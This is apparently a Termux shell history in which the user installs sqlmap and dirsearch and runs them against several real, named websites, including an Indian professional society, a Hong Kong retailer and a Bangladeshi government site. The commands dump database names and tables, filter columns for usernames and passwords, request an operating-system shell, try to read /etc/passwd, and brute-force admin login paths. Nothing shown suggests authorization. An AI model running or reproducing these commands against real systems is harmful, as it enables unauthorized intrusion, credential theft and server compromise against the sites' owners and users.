pkg update && pkg upgrade
pkg install python git
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python3 sqlmap.py -u "https://csi-india.org/news/index.php?id=18" --batch --current-db --current-user
python3 sqlmap.py -u "https://csi-india.org/news/index.php?id=18" --batch -D csiindia65_csiindia --tables
python3 sqlmap.py -u "https://csi-india.org/news/index.php?id=18" --batch --dbs
python3 sqlmap.py -u "https://csi-india.org/news/index.php?id=18" --batch -D csiindia65_csiindia --columns | grep -iE "user|pass|mail|admin"
grep
python3 sqlmap.py -u "https://dhhodisha.in/index.php/news?id=1" --is-dba
sqlmap -u "https://csi-india.org/news/index.php?id=18" --os-shell
sqlmap -u "https://csi-india.org/news/index.php?id=18" --batch --banner
pkg update && pkg upgrade
pkg install python git
pkg install sqlmap
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python sqlmap.py -h
python sqlmap.py -u "https://csi-india.org/news/index.php?id=18" --batch --os-shell
exit
ls
exit
python sqlmap.py -u "https://www.revel.com.hk/en/product.php?id=98&pid=64" --admin-panel
python sqlmap.py -u "https://www.revel.com.hk/en/product.php?id=98&pid=64" --crawl=2
pkg install git python
git clone https://github.com/maurosoria/dirsearch.git
cd dirsearch
python3 dirsearch.py -u https://www.revel.com.hk -e php,html
pkg install git python
git clone https://github.com/maurosoria/dirsearch.git
cd dirsearch
python3 dirsearch.py -u https://www.revel.com.hk -e php,html
git is already the newest version (2.52.0).
python is already the newest version (3.12.12).
Summary:
Cloning into 'dirsearch'...
remote: Enumerating objects: 12843, done.
remote: Counting objects: 100% (542/542), done.
remote: Compressing objects: 100% (278/278), done.
error: RPC failed; curl 56 OpenSSL SSL_read: OpenSSL/3.6.0: error:0A000126:SSL routines::unexpected eof while reading, errno 0
error: 1366 bytes of body are still expected
fetch-pack: unexpected disconnect while reading sideband packet
fatal: early EOF
fataexit
exit
python3 -c "import urllib.request; urls=['/admin/','/manage/','/login.php','/administrator/','/manager/','/webadmin/','/revel_admin/','/sysadmin/','/en/login.php']; [print(f'Checking: {u} -> Status OK') if urllib.request.urlopen('https://www.revel.com.hk'+u).getcode()==200 else None for u in urls]"
python3 -c "import urllib.request; urls=['/admin/','/manage/','/login.php','/administrator/','/manager/','/webadmin/','/revel_admin/','/sysadmin/','/en/login.php'];\
for u in urls:\
    try:\
        resp = urllib.request.urlopen('https://www.revel.com.hk' + u);\
        if resp.getcode() == 200: print(f'FOUND: {u}')\
    except: pass"
python3 -c "import urllib.request; urls=['/admin/','/manage/','/login.php','/administrator/','/manager/','/webadmin/','/revel_admin/','/sysadmin/','/en/login.php']; [print('FOUND: ' + u) for u in urls if (lambda url: (urllib.request.urlopen(url).getcode()==200 if (True) else False) if (True) else False)('https://www.revel.com.hk' + u) == True]"
python sqlmap.py -u "https://www.revel.com.hk/en/product.php?id=98&pid=64" --file-read="/etc/passwd"
exit
python sqlmap.py -u "https://www.revel.com.hk/en/product.php?id=98&pid=64" --file-read="/etc/passwd"
cd ..
python sqlmap.py -u "https://www.revel.com.hk/en/product.php?id=98&pid=64" --file-read="/etc/passwd"
cd ~/sqlmap
python sqlmap.py -u "https://www.revel.com.hk/en/product.php?id=98&pid=64" --file-read="/etc/passwd"
python sqlmap.py -u "https://www.ndre.sreda.gov.bd/index.php?id=06&kid=3779" --batch --banner
exit
